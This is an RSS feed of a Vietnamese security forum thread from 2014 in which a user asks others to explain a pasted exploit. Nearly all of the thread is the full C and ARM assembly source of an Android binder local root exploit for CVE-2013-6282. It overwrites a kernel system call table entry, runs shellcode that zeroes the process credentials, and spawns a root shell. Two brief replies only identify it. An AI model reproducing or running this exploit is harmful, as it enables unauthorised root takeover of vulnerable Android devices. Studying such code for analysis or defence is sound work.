<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "hỏi cách phân tích 1 exploit"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "hỏi cách phân tích 1 exploit"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>hỏi cách phân tích 1 exploit</title>
				<description><![CDATA[ anh em có thể phân tích cho em nhiệm vụ của code này không ạ
/*
 * Just a lame binder local root exploit stub. Somewhat messy but whatever. The bug was reported in CVE-2013-6282.
 *
 * Tested on Android 4.2.2 and 4.4. Kernels 3.0.57, 3.4.5 and few more. All up to 3.4.5 unpatched should be vulnerable.
 * You need to customize the addresses so that they match the target board. On Android, both /proc/kallsyms and dmesg are
 * restricted, thus no automation here.
 *
 * Rigged up by Piotr Szerman. (c) 2013
 *
*/
 
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;
 
/* Binder transaction request format */
struct binder_write_read {
        signed long     write_size;     /* bytes to write */
        signed long     write_consumed; /* bytes consumed by driver */
        unsigned long   write_buffer;
        signed long     read_size;      /* bytes to read */
        signed long     read_consumed;  /* bytes consumed by driver */
        unsigned long   read_buffer;
} bwr;
 
#define BR_NOOP         0x0000720c  /* binder memory write value */
#define SC_TABLE        0xc000ee28  /* system call table address */
/* we need to know the lower halfword of the original address of sys_ni_syscall to tailor MMAP_AREA and MMAP_OFF accordingly.
 * you can aid yourself with a NOP block. the higher halfword will in any case become 0x720c. on one of my boxes, the other
 * halfword was 0xdac4. MMAP_AREA must be aligned appropriately. you can extract all the data in question at runtime from
 * /proc/kallsyms and dmesg (not that hard to set off infoleaks with this bug) as long as there are no contraints in place
 */
#define MMAP_AREA       0x720cd000  /* userspace landing point page-aligned address. */
#define MMAP_OFF        0xac4       /* offset within it to plant the payload */
#define NUM_PAGES       16
#define PAGE_SIZE       4096
#define NOP         0xe1a00000  /* mov r0, r0 */
#define SHELL           &quot;/system/bin/sh&quot;
#define TARGET_APERTURE     68      /* aiming for two adjacent non-implemented syscalls. check arch/arm/kernel/calls.S */
#define BINDER_WRITE_READ   0xc0186201  /* printk your BINDER_WRITE_READ ;) */
 
/* the target payload */
void __attribute__((regparm(3))) shellcode(void)
{
    asm volatile(
 
        &quot;__transgressor:;&quot;
        &quot;push   {r0-r12,lr}&quot;        &quot;\n\t&quot;
        &quot;mov    r1, sp&quot;         &quot;\n\t&quot; /* calculate the process descriptor location */
        &quot;bic    r2, r1, #8128&quot;      &quot;\n\t&quot;
        &quot;bic    r2, r2, #63&quot;        &quot;\n\t&quot;
        &quot;ldr    r3, [r2, #12]&quot;      &quot;\n\t&quot;
         
        &quot;movt   r0, #0&quot;         &quot;\n\t&quot;
        &quot;movw   r0, #0&quot;         &quot;\n\t&quot;
 
        &quot;ldr    r1, [r3, #492]&quot;     &quot;\n\t&quot;  /* cred's location may differ depending on the kernel config. 
                             * just build and objdump a kernel module with printk(current-&gt;cred-&gt;uid)
                             * to find out. or pinpoint it with the help of kgdb or whatever ;)
                             */
        &quot;mov    r4, #8&quot;         &quot;\n\t&quot;
        &quot;__loop_cred:;&quot;
        &quot;sub    r4, r4, #1&quot;     &quot;\n\t&quot;
        &quot;str    r0, [r1, #4]!&quot;      &quot;\n\t&quot;
        &quot;teq    r4, #0&quot;         &quot;\n\t&quot;
        &quot;bne    __loop_cred&quot;        &quot;\n\t&quot;
 
        &quot;ldr    r1, [r3, #488]&quot;     &quot;\n\t&quot;  /* real_cred. overkill? */
        &quot;mov    r4, #8&quot;         &quot;\n\t&quot;
        &quot;__loop_real_cred:;&quot;
        &quot;sub    r4, r4, #1&quot;     &quot;\n\t&quot;
        &quot;str    r0, [r1, #4]!&quot;      &quot;\n\t&quot;
        &quot;teq    r4, #0&quot;         &quot;\n\t&quot;
        &quot;bne    __loop_real_cred&quot;   &quot;\n\t&quot;
 
        &quot;ldm    sp!, {r0-r12,pc}&quot;   &quot;\n\t&quot; /* return to ret_fast_syscall */
        &quot;mov    pc, lr&quot;         &quot;\n\t&quot;
    );
}
 
int
main(int ac, char **av)
{
    char * const shell[] = { SHELL, NULL };
    char *map;
    int fd;
 
    fprintf(stderr, &quot;[!] binder local root exploit\n[!] (c) piotr szerman\n&quot;);
 
    fd = open(&quot;/dev/binder&quot;, O_RDWR);
 
    if(fd &lt; 0)
    {
        fprintf(stderr, &quot;[-] failed to reach out for binder. (%s)\n&quot;, strerror(errno));
        exit(EXIT_FAILURE);
    }
 
    map = mmap((void *)MMAP_AREA, NUM_PAGES * PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_LOCKED, 0, 0);
 
    if(map == (void *)-1)
    {
        perror(&quot;mmap() &quot;);
        exit(EXIT_FAILURE);
    }
 
    fprintf(stderr, &quot;[+] userspace map area == 0x%08lx\n&quot;, (unsigned long)map);
 
    fprintf(stderr, &quot;[+] placing NOP block at 0x%08lx\n&quot;, (unsigned long)map);
    memset(map, NOP, MMAP_OFF);
    fprintf(stderr, &quot;[+] copying payload to 0x%08lx\n&quot;, (unsigned long)map + MMAP_OFF);
    /* look at the objdump of shellcode to see the correct offset */
    memcpy(map + MMAP_OFF, (unsigned char *)shellcode + 8 /* offseting to the __transgressor */, 30 * sizeof(void *) /* copy all opcodes */);
 
    fprintf(stderr, &quot;[+] constructing rogue data structure.\n&quot;);
 
    bwr.write_size = 0;
    bwr.write_consumed = 0;
    bwr.read_size = 1;
    bwr.read_consumed = 0;
    /* targeting the aperture between 2 undefined system calls in the table */
    bwr.read_buffer = (unsigned long)((unsigned char *)SC_TABLE + TARGET_APERTURE * sizeof(void *) + 2);
     
    /* calculate process descriptor address with the aid of sp:
     * task_struct = *( ((unsigned long *) ( (sp & ~(0xbf000000 - 1)) & ~0x3f )) + 3);
     */
 
    ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);
 
    sleep(5); /* give binder ample time to service the transaction. if it's under heavy load, the exploit might fail */
 
    fprintf(stderr, &quot;[+] r00ting device...\n\n&quot;);
 
    asm volatile(
            &quot;mov r7, %0\n\t&quot;
            &quot;swi 0\n\t&quot;
            : : &quot;I&quot; (TARGET_APERTURE)
        );
 
    execve(shell[0], shell, NULL);
     
    return EXIT_FAILURE;]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45771.html#281299</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/45771.html#281299</link>
				<pubDate><![CDATA[Thu, 14 Aug 2014 01:34:41]]> GMT</pubDate>
				<author><![CDATA[ thánh rồi]]></author>
			</item>
			<item>
				<title>hỏi cách phân tích 1 exploit</title>
				<description><![CDATA[ Một kernel exploit dành cho Android, code được viết trong ngôn ngữ C, và inline Assembly, code có thể được dịch bởi GCC, phần description được viết bằng tiếng ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45771.html#281303</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/45771.html#281303</link>
				<pubDate><![CDATA[Thu, 14 Aug 2014 08:19:12]]> GMT</pubDate>
				<author><![CDATA[ van7hu]]></author>
			</item>
			<item>
				<title>hỏi cách phân tích 1 exploit</title>
				<description><![CDATA[ Các comment của họ đã giải thích nghĩa của đoạn code tương đối đầy đủ. Không biết bạn chưa hiểu đoạn nào?.]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/45771.html#281319</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/45771.html#281319</link>
				<pubDate><![CDATA[Fri, 15 Aug 2014 15:47:54]]> GMT</pubDate>
				<author><![CDATA[ hoangcuongflp]]></author>
			</item>
	</channel>
</rss>
